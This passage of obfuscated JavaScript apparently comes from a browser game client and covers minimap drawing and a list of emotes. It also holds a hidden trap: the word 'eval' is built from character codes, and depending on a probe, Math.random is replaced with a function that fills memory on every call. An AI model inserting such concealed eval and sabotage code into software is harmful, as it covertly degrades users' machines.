		sprite[10007][1] = sprite[10007][0];
		sprite[10008][1] = sprite[10008][0];
		sprite[10009][1] = sprite[10009][0];
		sprite[10010][1] = sprite[10010][0];
		sprite[10011][1] = sprite[10011][0];
		sprite[10012][1] = sprite[10012][0];
		sprite[10013][1] = sprite[10013][0];
		sprite[10014][1] = sprite[10014][0];
		sprite[10015][1] = sprite[10015][0];
		sprite[10016][1] = sprite[10016][0];
		sprite[10017][1] = sprite[10017][0];
		sprite[10018][1] = sprite[10018][0];
		sprite[10019][1] = sprite[10019][0];
		sprite[10020][1] = sprite[10020][0];
		sprite[10021][1] = sprite[10021][0];
		sprite[10022][1] = sprite[10022][0];
		sprite[10023][1] = sprite[10023][0];
		sprite[10024][1] = sprite[10024][0];
		sprite[10025][1] = sprite[10025][0];
		sprite[10026][1] = sprite[10026][0];
		sprite[10027][1] = sprite[10027][0];
		sprite[10028][1] = sprite[10028][0];
		sprite[10029][1] = sprite[10029][0];
		sprite[10030][1] = sprite[10030][0];
		sprite[10031][1] = sprite[10031][0];
		sprite[10032][1] = sprite[10032][0];
		sprite[10033][1] = sprite[10033][0];
		sprite[10034][1] = sprite[10034][0];
		sprite[10035][1] = sprite[10035][0];
		ⵠⵠⵠ = {};
		ⵠⵠⵠ.ⵠᐃⵠΔΔ = 0;
		ⵠⵠⵠ.ⵠⲆⲆᐃ = 1;
		const ⲆⵠΔⵠΔΔΔ = ⲆᐃⲆΔⲆΔⲆ;
		ⵠⵠⵠ.ᐃᐃΔⲆ = ⲆⲆΔᐃ;
		ⵠⵠⵠ.ΔⲆⵠⵠ = ΔΔᐃΔ;
		const Δⵠᐃⵠ = ᐃᐃⲆΔⵠ;
		ⵠⵠⵠ.ΔⲆᐃΔ = 4;
		ⵠⵠⵠ.ⲆⵠΔⲆ = 5;
		ⵠⵠⵠ.ⲆΔᐃᐃ = 6;
		ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ = ΔⲆΔᐃᐃ;
		const ⲆⲆⵠⲆⵠ = ⵠᐃⵠᐃΔΔΔ;
		ⵠⵠⵠ.ⲆᐃΔᐃⵠ = ᐃⵠⲆᐃᐃ;
		const ⲆᐃΔⵠⵠΔᐃ = ⵠⲆᐃⵠⲆᐃΔ;
		ᐃⲆⵠⲆ = {};
		ᐃⵠᐃⲆ = [];
		const ⲆΔᐃⲆΔᐃΔ = ΔⲆᐃᐃᐃ;
		const ⵠⵠΔᐃΔ = ⲆⵠΔⵠ;
		ⵠⲆᐃⵠΔΔⵠ = function(ⵠⲆᐃΔᐃⵠⲆ, ᐃΔ) {
			for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < ⵠⲆᐃΔᐃⵠⲆ.length; ⵠᐃ++) {
				if (ⵠⲆᐃΔᐃⵠⲆ[ⵠᐃ].id === ᐃΔ) return ⵠᐃ
			}
			return -ⵠⲆΔ
		};
		const ⵠⲆⲆⵠΔⵠⲆ = ᐃΔᐃⲆⲆ;
		const ΔΔᐃⵠ = ⲆⵠⲆⲆ;
		var ΔΔΔⲆΔᐃΔ = [];
		const ⲆⲆᐃⵠᐃ = ΔΔⵠⲆΔ;

		function ᐃΔᐃᐃᐃ(ᐃᐃⵠⵠ, ΔⲆᐃΔⲆ) {
			for (var ⵠᐃ = 0; ⵠᐃ < ΔΔΔⲆΔᐃΔ.length; ⵠᐃ += ΔⲆᐃΔⲆ) {
				var ⲆⲆⵠ = ΔΔΔⲆΔᐃΔ[ⵠᐃ];
				if (ᐃᐃⵠⵠ === ⲆⲆⵠ[0]) ⲆⵠᐃᐃⵠΔⲆⲆᐃ(ⲆⲆⵠ[0], ⲆⲆⵠ[ᐃΔᐃⲆ], ⲆⲆⵠ[Δⵠⵠⵠ], ⲆⲆⵠ[3])
			}
		}

		function ⲆⵠᐃⲆΔΔᐃⲆⵠ() {
			ᐃΔᐃᐃᐃ(ⵠ[424], ΔⵠΔⵠ);
			ᐃΔᐃᐃᐃ(ⵠ[26], 20);
			ᐃΔᐃᐃᐃ(ⵠ[156], 1);
			ᐃΔᐃᐃᐃ("c", 1);
			ᐃΔᐃᐃᐃ("s", 1);
			ᐃΔᐃᐃᐃ("f", 1);
			ᐃΔᐃᐃᐃ("p", ΔⵠΔⵠ);
			ᐃΔᐃᐃᐃ("g", 1);
			ᐃΔᐃᐃᐃ("d", ΔⲆᐃᐃ);
			ᐃΔᐃᐃᐃ("a", 1);
			ᐃΔᐃᐃᐃ(ⵠ[196], ⵠΔⲆ);
			ᐃΔᐃᐃᐃ("m", 1);
			ΔΔΔⲆΔᐃΔ = []
		}
		const ΔⲆⵠⲆⲆ = ⵠⲆⲆᐃⵠ;
		const ⵠᐃⲆΔᐃᐃⲆ = ᐃΔⲆᐃᐃΔᐃ;

		function ᐃΔᐃⵠᐃⵠⲆⵠⵠ(ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⵠᐃ, ᐃⵠᐃⵠ) {
			ΔΔΔⲆΔᐃΔ.push([ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⵠᐃ, ᐃⵠᐃⵠ])
		}
		const ⲆⲆᐃᐃΔⵠⵠ = ⲆⲆΔⲆⵠᐃᐃ;
		const ⲆⲆⵠⲆᐃᐃⲆ = ⲆΔΔⵠⲆ;

		function ⲆⵠᐃᐃⵠΔⲆⲆᐃ(ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⵠᐃ, ᐃⵠᐃⵠ) {
			var ᐃⲆⵠᐃᐃᐃΔ = ᐃⵠᐃⲆ[ᐃᐃⵠⵠ];
			if (ᐃⲆⵠᐃᐃᐃΔ === ΔΔΔⲆΔ) return;
			for (var ⵠᐃⲆⲆ = Δⵠᐃ; ⵠᐃⲆⲆ < ⲆⵠΔΔ; ⵠᐃⲆⲆ++) {
				var ᐃⵠ = ᐃⲆⵠᐃᐃᐃΔ[ΔⲆᐃᐃΔ][ⵠᐃⲆⲆ];
				var Δⵠ = 193 * ᐃⵠᐃⵠ / ⲆⲆⲆ.ᐃΔᐃᐃΔ;
				var ⲆⵠⲆ = 193 * ⵠᐃ / ⲆⲆⲆ.ⵠᐃⵠⲆⵠ;
				var ᐃⵠⵠ = ᐃⵠ.width / 3.5;
				var ⵠⵠᐃ = ᐃⵠ.height / 3.5;
				ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃⲆⲆ].drawImage(ᐃⵠ, Δⵠ - ᐃⵠⵠ / 2, ⲆⵠⲆ - ⵠⵠᐃ / ⲆΔΔⵠ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δⵠ = ᐃⵠᐃⵠ * 600 / ⲆⲆⲆ.ᐃΔᐃᐃΔ;
				ⲆⵠⲆ = ⵠᐃ * 600 / ⲆⲆⲆ.ⵠᐃⵠⲆⵠ;
				ᐃⵠⵠ = ᐃⵠ.width / 1.5;
				ⵠⵠᐃ = ᐃⵠ.height / 1.5;
				ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃⲆⲆ].drawImage(ᐃⵠ, Δⵠ - ᐃⵠⵠ / 2, ⲆⵠⲆ - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ)
			}
		}
		ᐃᐃΔᐃᐃⵠⵠⵠⵠ = function() {
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ᐃⲆΔⲆ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].clearRect(0, ᐃⵠΔ, 193, 193);
				ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ["MAP"][ⵠᐃ], ⵠΔⲆⵠ, 0, 193, 193);
				ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].clearRect(Ⲇᐃⵠⵠ, 0, 600, 600);
				ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ["MAP"][ⵠᐃ], Δⵠᐃ, 0, 600, 600);
				for (var ᐃⵠᐃⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length - 1; ᐃⵠᐃⵠ >= ⲆⲆⲆᐃ; ᐃⵠᐃⵠ--) {
					var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ᐃⵠᐃⵠ];
					var Δⵠ = 193 * ᐃⲆⲆⵠ.x1 / (ⵠⵠΔᐃᐃ * ⲆⲆⲆ.ᐃΔᐃᐃΔ);
					var ⲆⵠⲆ = 193 * ᐃⲆⲆⵠ.y1 / (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * ΔᐃⵠⲆⲆ);
					var ᐃⵠⵠ = ᐃⲆⲆⵠ.w * 193 / (ⲆⲆⲆ.ᐃΔᐃᐃΔ * ⵠⲆⲆᐃⵠΔⵠ);
					var ⵠⵠᐃ = 193 * ᐃⲆⲆⵠ.ⵠⵠᐃ / (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * ᐃΔⲆⲆᐃ);
					var ⲆⲆⵠⵠⵠ = 600 * ᐃⲆⲆⵠ.x1 / (100 * ⲆⲆⲆ.ᐃΔᐃᐃΔ);
					var ⵠᐃᐃⲆⵠ = ᐃⲆⲆⵠ.y1 * 600 / (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * 100);
					var ΔᐃΔⵠⵠΔΔ = 600 * ᐃⲆⲆⵠ.w / (ⵠᐃᐃᐃᐃΔⵠ * ⲆⲆⲆ.ᐃΔᐃᐃΔ);
					var ΔⲆᐃΔΔⵠᐃ = ᐃⲆⲆⵠ.ⵠⵠᐃ * 600 / (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * 100);
					ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⲆΔΔᐃΔ && (ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[573]][ⵠᐃ], Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ), ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[573]][ⵠᐃ], ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ, ΔᐃΔⵠⵠΔΔ, ΔⲆᐃΔΔⵠᐃ));
					ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ && (ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[437]][ⵠᐃ], Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ), ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[437]][ⵠᐃ], ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ, ΔᐃΔⵠⵠΔΔ, ΔⲆᐃΔΔⵠᐃ));
					if (ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ === ᐃⲆⲆⵠ.ΔᐃⲆ) {
						ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[262]][ⵠᐃ], Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
						ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[262]][ⵠᐃ], ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ, ΔᐃΔⵠⵠΔΔ, ΔⲆᐃΔΔⵠᐃ)
					}
					if (ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ === ᐃⲆⲆⵠ.ΔᐃⲆ) {
						ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ["CAVE"][ⵠᐃ], Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
						ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ["CAVE"][ⵠᐃ], ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ, ΔᐃΔⵠⵠΔΔ, ΔⲆᐃΔΔⵠᐃ)
					}
					ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ && (ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[33]][ⵠᐃ], Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ), ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ].drawImage(ᐃⵠᐃⲆ[ⵠ[33]][ⵠᐃ], ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ, ΔᐃΔⵠⵠΔΔ, ΔⲆᐃΔΔⵠᐃ))
				}
			}
		};
		const ⲆⲆⵠⲆΔᐃⵠ = String.fromCharCode;
		const ᐃΔⲆⲆᐃΔⵠ = 101;
		const ⲆᐃᐃⲆⲆΔᐃ = 118;
		const ⵠΔΔᐃᐃⵠⵠᐃⵠ = "ᐃⲆⲆⵠⵠⲆⵠᐃΔ";
		const ΔΔΔⵠⲆⲆΔ = 97;
		const ΔⲆⵠⲆⵠⵠⲆⵠⵠ = 108;
		const ⵠⲆⲆⲆⲆⵠⵠ = ⲆⲆⵠⲆΔᐃⵠ(ᐃΔⲆⲆᐃΔⵠ);
		const ΔⲆΔⲆᐃᐃⲆΔⵠ = ⲆⲆⵠⲆΔᐃⵠ(ⲆᐃᐃⲆⲆΔᐃ);

		function ᐃⲆⲆⵠⵠⲆⵠᐃΔ() {
			ΔΔⲆⲆⵠᐃΔⵠⲆ = ᐃⲆⲆⵠⵠⲆⵠᐃΔ;
			return ᐃⲆⲆⵠⵠⲆⵠᐃΔ
		}
		const ⵠⵠⲆⵠⵠⵠᐃⵠⵠ = ⲆⲆⵠⲆΔᐃⵠ(ΔΔΔⵠⲆⲆΔ);
		const ΔᐃᐃΔⲆᐃᐃⵠΔ = ⲆⲆⵠⲆΔᐃⵠ(ΔⲆⵠⲆⵠⵠⲆⵠⵠ);
		const ⵠⵠⵠⲆᐃᐃⵠ = ⵠⲆⲆⲆⲆⵠⵠ + ΔⲆΔⲆᐃᐃⲆΔⵠ + ⵠⵠⲆⵠⵠⵠᐃⵠⵠ + ΔᐃᐃΔⲆᐃᐃⵠΔ;
		const ᐃⲆᐃΔⲆΔⵠⲆⲆ = ᐃⲆᐃΔᐃⵠᐃ[ⵠⵠⵠⲆᐃᐃⵠ];
		const ⲆΔⵠᐃⵠᐃⲆ = ᐃⲆᐃΔⲆΔⵠⲆⲆ(ᐃⲆⲆⵠⵠⲆⵠᐃΔ + "try{" + ⵠΔΔᐃᐃⵠⵠᐃⵠ + "();0;}catch(ⵠⵠⲆⵠⵠⵠᐃⵠⵠ){1;}");
		if (ⲆΔⵠᐃⵠᐃⲆ) {
			const ⲆⲆⵠⲆΔᐃⵠ = Math.random;
			const ⲆᐃᐃⲆⲆΔᐃ = [];
			const ᐃΔⲆⲆᐃΔⵠ = function() {
				for (let ΔΔΔⵠⲆⲆΔ = 0; ΔΔΔⵠⲆⲆΔ < 9886; ΔΔΔⵠⲆⲆΔ++) ⲆᐃᐃⲆⲆΔᐃ.push(ΔΔΔⵠⲆⲆΔ);
				return ⲆⲆⵠⲆΔᐃⵠ()
			};
			Math.random = ᐃΔⲆⲆᐃΔⵠ
		}
		ⲆⵠⵠⲆⲆⲆⲆᐃΔ = function() {
			ᐃⲆⵠⲆ = {
				"ᐃⵠⲆⲆᐃ": [{
					id: ᐃⵠΔ,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⵠⵠⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃⵠΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠᐃᐃⲆⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠᐃᐃΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Starver"
				}, {
					id: 3,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔⵠⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⲆᐃΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠΔᐃᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆΔⲆᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Angry"
				}, {
					id: ⲆⵠΔΔ,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠΔⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃⲆΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃᐃᐃΔⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⲆΔΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sad"
				}, {
					id: 9,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⵠⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆΔⲆⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆᐃΔᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⵠᐃΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Happy 1"
				}, {
					id: ᐃΔᐃⲆ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔⵠᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⵠᐃⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠΔᐃᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔᐃΔⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "What?"
				}, {
					id: 4,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠᐃⵠⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⵠⵠⵠⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔᐃⲆΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Suspicious"
				}, {
					id: ᐃⲆⵠΔ,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃᐃΔΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔΔΔⵠⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠⲆᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Scar"
				}, {
					id: 6,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠⲆΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆΔᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⲆᐃⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⵠⵠᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "In Trouble"
				}, {
					id: ᐃⵠⲆᐃΔⵠᐃ,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⲆΔⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⵠⵠⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⵠⵠⵠᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠΔᐃᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Cute"
				}, {
					id: ᐃᐃⵠᐃᐃΔΔ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⵠᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃⵠΔΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⲆᐃⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃⵠⵠᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bored 1"
				}, {
					id: 10,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆᐃᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃᐃᐃᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆᐃᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Happy 2"
				}, {
					id: 11,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⵠΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⲆᐃⲆᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆᐃⵠΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Crazy"
				}, {
					id: ⵠⲆΔΔᐃ,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔΔΔⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔᐃΔⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃΔΔᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠⵠⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Happy 3"
				}, {
					id: ΔⵠⲆΔⲆⲆᐃ,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆᐃᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⵠⲆⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⲆΔᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.Δᐃᐃᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Very Cute"
				}, {
					id: ΔΔⲆᐃⲆΔⵠ,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⲆⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆΔΔΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃⲆⲆᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃΔⵠⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Curious"
				}, {
					id: 15,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔⵠᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠⵠⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃΔⵠⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃΔⵠᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bored 2"
				}, {
					id: ⵠᐃⲆᐃᐃΔⵠ,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔⵠΔΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃᐃΔⲆᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃΔⵠᐃᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Happy 4"
				}, {
					id: 17,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠⵠΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠᐃⵠᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆⵠⵠⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Scar 2"
				}, {
					id: 18,
					"ᐃΔⲆ": ⲆΔ.Ⲇⵠⵠᐃᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠⵠΔᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⵠⵠΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆΔΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sick"
				}, {
					id: ⲆⲆΔᐃΔΔⵠ,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃⵠⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⲆᐃΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃᐃΔΔΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔΔᐃⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Somnambule"
				}, {
					id: 24,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔΔⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠᐃⵠⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⵠᐃⲆΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.Ⲇᐃⵠᐃᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[362],
					name: "Feel Bad"
				}, {
					id: 23,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃⲆⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃΔΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠⲆᐃᐃⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⲆⲆᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[362],
					name: "Mmmh."
				}, {
					id: 103,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⲆᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃⵠⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃΔⲆⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃⲆⵠᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Panic"
				}, {
					id: 105,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔᐃⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔΔⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃᐃⵠᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃΔᐃⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Hypnotic"
				}, {
					id: 106,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠⵠⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠⵠΔΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⵠⲆⲆΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⵠᐃᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Stars in the eyes"
				}, {
					id: 220,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆΔΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⵠΔΔⵠ,
